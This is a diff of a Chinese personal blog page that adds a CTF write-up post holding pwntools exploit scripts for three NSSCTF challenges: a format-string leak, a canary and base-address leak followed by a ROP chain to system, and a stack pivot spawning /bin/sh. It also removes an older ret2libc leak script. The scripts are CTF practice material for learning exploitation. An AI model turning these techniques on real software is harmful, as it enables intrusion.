@@ -171,6 +171,108 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://yourdomain.com/2026/05/07/nss/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="林夏">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="林夏的博客">
+      <meta itemprop="description" content="个人博客，记录技术、生活和思考">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | 林夏的博客">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/05/07/nss/" class="post-title-link" itemprop="url">nssctf 1</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-05-07 20:00:00" itemprop="dateCreated datePublished" datetime="2026-05-07T20:00:00+08:00">2026-05-07</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-05-14 19:22:19" itemprop="dateModified" datetime="2026-05-14T19:22:19+08:00">2026-05-14</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6/" itemprop="url" rel="index"><span itemprop="name">技术研究</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <span id="more"></span>
+<h1 id="1-HNCTF-2022-Week1-fmtstrre"><a href="#1-HNCTF-2022-Week1-fmtstrre" class="headerlink" title="1.[HNCTF 2022 Week1]fmtstrre"></a>1.[HNCTF 2022 Week1]fmtstrre</h1><p> 格式化字符串，调试发现发现实际偏移为38 即存放flag的&amp;name的地址，脚本；<br>from pwn import*</p>
+<p>p&#x3D;remote(‘node5.anna.nssctf.cn’,29517)<br>p.recvuntil(‘Input your format string.\n’)</p>
+<p>payload&#x3D;’%38$s’</p>
+<p>p.sendline(payload)<br>p.interactive()</p>
+<h1 id="2-深育杯-2021-find-flag"><a href="#2-深育杯-2021-find-flag" class="headerlink" title="2.[深育杯 2021]find_flag"></a>2.[深育杯 2021]find_flag</h1><p> 进入程序，发现格式化字符串漏洞，随后找到canary地址并且计算基地址，后面为啥加指针没理解，只记住;脚本：<br> from pwn import*</p>
+<p>p&#x3D;process(“.&#x2F;fg”)<br>#p&#x3D;remote(“node4.anna.nssctf.cn”,24711)<br>payload1&#x3D;’%17$paaa%19$p’<br>p.recvuntil(b’name? ‘)<br>payload1 &#x3D; b’%17$p—%19$p’<br>p.sendline(payload1)<br>p.recvuntil(b’you, ‘)</p>
+<p>canary &#x3D; int(p.recv(18), 16)<br>print(hex(canary))</p>
+<p>p.recvuntil(b’—‘)<br>base &#x3D; int(p.recv(14), 16)<br>print(hex(base))</p>
+<p>Base &#x3D; base - 0x146F</p>
+<p>system &#x3D; Base + elf.sym[‘system’]<br>catflag &#x3D; Base + 0x2004<br>rdi &#x3D; Base + 0x14E3<br>ret &#x3D; Base + 0x101A</p>
+<p>payload &#x3D; b’a’*0x38 + p64(canary) + b’a’*8 + p64(ret) + p64(rdi) + p64(catflag) + p64(system)<br>p.recvuntil(b’else? ‘)<br>p.sendline(payload)<br>p.recv()<br>p.interactive()</p>
+<h1 id="3-CISCN-2019东南-PWN2"><a href="#3-CISCN-2019东南-PWN2" class="headerlink" title="3.[CISCN 2019东南]PWN2"></a>3.[CISCN 2019东南]PWN2</h1><p>检查完保护并且打开ida,然后分析，因为read 函数 限制了输入长度不超过 0x30 个字节 ，也就意味着 我们输入的数据 只能覆盖到 ret_addr 。随后进行栈迁移。找到leave地址，后面的还在积极理解脚本：<br>from pwn import *<br>#p&#x3D;process(‘.&#x2F;p2’)<br>p &#x3D; remote(‘node5.anna.nssctf.cn’,26611)<br>leave_ret &#x3D; 0x08048562<br>system_addr &#x3D; 0x08048400<br>leak &#x3D; b’a’*(0x27) + b’B’</p>
+<p>p.recvuntil(“name?”)</p>
+<p>p.send(leak)<br>p.recvuntil(b’B’)<br>old_edp &#x3D; u32(p.recv(4))<br>print(hex(old_edp))</p>
+<p>payload &#x3D; b’a’*4 + p32(system_addr) + b’a’*4 + p32(old_edp - 0x28) + b’&#x2F;bin&#x2F;sh\x00’</p>
+<p>payload &#x3D; payload.ljust(0x28, b’\x00’)<br>payload +&#x3D; p32(old_edp - 0x38) + p32(leave_ret)<br>p.recvuntil(‘\n’)<br>p.send(payload)</p>
+<p>p.interactive()</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
     <link itemprop="mainEntityOfPage" href="https://yourdomain.com/2026/05/07/re2libc/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -263,90 +365,6 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://yourdomain.com/2026/05/07/nss/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="林夏">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="林夏的博客">
-      <meta itemprop="description" content="个人博客，记录技术、生活和思考">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | 林夏的博客">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2026/05/07/nss/" class="post-title-link" itemprop="url">nssctf</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2026-05-07 20:00:00" itemprop="dateCreated datePublished" datetime="2026-05-07T20:00:00+08:00">2026-05-07</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-05-11 19:30:45" itemprop="dateModified" datetime="2026-05-11T19:30:45+08:00">2026-05-11</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6/" itemprop="url" rel="index"><span itemprop="name">技术研究</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <span id="more"></span>
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
     <link itemprop="mainEntityOfPage" href="https://yourdomain.com/2026/04/28/resyscall/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -411,98 +429,6 @@
 </li>
 </ol>
 
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://yourdomain.com/2026/04/22/week%E4%B8%8A2/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="林夏">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="林夏的博客">
-      <meta itemprop="description" content="个人博客，记录技术、生活和思考">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | 林夏的博客">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2026/04/22/week%E4%B8%8A2/" class="post-title-link" itemprop="url">week2pwn题上</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2026-04-22 20:33:00" itemprop="dateCreated datePublished" datetime="2026-04-22T20:33:00+08:00">2026-04-22</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-04-28 15:23:25" itemprop="dateModified" datetime="2026-04-28T15:23:25+08:00">2026-04-28</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">二进制安全</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>buu的题</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2026/04/22/week%E4%B8%8A2/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
       
     </div>
 
@@ -620,6 +546,98 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://yourdomain.com/2026/04/22/week%E4%B8%8A2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="林夏">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="林夏的博客">
+      <meta itemprop="description" content="个人博客，记录技术、生活和思考">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | 林夏的博客">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/04/22/week%E4%B8%8A2/" class="post-title-link" itemprop="url">week2pwn题上</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-04-22 20:33:00" itemprop="dateCreated datePublished" datetime="2026-04-22T20:33:00+08:00">2026-04-22</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-04-28 15:23:25" itemprop="dateModified" datetime="2026-04-28T15:23:25+08:00">2026-04-28</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">二进制安全</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>buu的题</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2026/04/22/week%E4%B8%8A2/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
     <link itemprop="mainEntityOfPage" href="https://yourdomain.com/2026/04/21/%E6%88%91%E7%9A%84%E6%8C%87%E4%BB%A4/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -656,7 +674,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-05-05 11:20:40" itemprop="dateModified" datetime="2026-05-05T11:20:40+08:00">2026-05-05</time>
+      <time title="修改时间：2026-05-13 20:01:18" itemprop="dateModified" datetime="2026-05-13T20:01:18+08:00">2026-05-13</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -681,7 +699,8 @@
           <span id="more"></span>
 <h2 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h2><p>chmod +x WebSocketReflectorX-0.5.17-linux-gnu-x86_64.AppImage<br>.&#x2F;WebSocketReflectorX-0.5.17-linux-gnu-x86_64.AppImage</p>
 <p>hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</p>
-<p>ROPgadget –binary .&#x2F;pwn1 | grep “ret”<br>from pwn import *<br>context(arch&#x3D;’amd64’, os&#x3D;’linux’, log_level&#x3D;’debug’)<br>r &#x3D; process(‘cc1’)<br>elf &#x3D; ELF(‘.&#x2F;cc1’)<br>pop_rdi_offset &#x3D; 0x400c83<br>puts_plt_offset &#x3D; elf.plt[‘puts’]<br>puts_got_offset &#x3D; elf.got[‘puts’]<br>main_offset &#x3D; 0x400B28<br>padding &#x3D; 88<br>payload &#x3D; b’a’*padding<br>payload +&#x3D; p64(pop_rdi_offset)<br>payload +&#x3D; p64(puts_got_offset)<br>payload +&#x3D; p64(puts_plt_offset)<br>payload +&#x3D; p64(main_offset)<br>r.sendlineafter(b’Input your choice!’, b’1’)<br>r.sendline(payload)<br>r.recvuntil(b’Ciphertext\n’)<br>leak &#x3D; u64(r.recvline().strip().ljust(8,b’\x00’))<br>puts_addr &#x3D; u64(leak)<br>print(f”leaked puts: {hex(puts_addr)}”)<br>r.interactive()</p>
+<p>ROPgadget –binary .&#x2F;pwn1 | grep “ret”</p>
+<p>ROPgadget –binary .&#x2F;p2 –only “leave|ret”</p>
 
       
     </div>
